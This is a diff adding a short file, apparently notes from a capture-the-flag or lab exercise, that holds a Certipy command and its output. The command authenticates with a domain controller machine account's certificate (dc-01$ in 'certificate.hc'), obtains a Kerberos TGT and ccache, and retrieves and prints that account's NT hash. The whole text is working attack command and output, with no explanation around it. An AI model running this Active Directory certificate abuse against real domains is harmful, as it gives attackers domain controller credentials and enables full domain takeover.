@@ -1,0 +1,9 @@
+certipy-ad auth -pfx certificates/dc-01.pfx -dc-ip $IP -domain certificate.hc -debug 
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: dc-01$@certificate.hc
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'dc-01.ccache'
+[*] Trying to retrieve NT hash for 'dc-01$'
+[*] Got hash for 'dc-01$@certificate.hc': aad3b435b51404eeaad3b435b51404ee:3cb5326f425ad394e3e79b68db4fc8cd
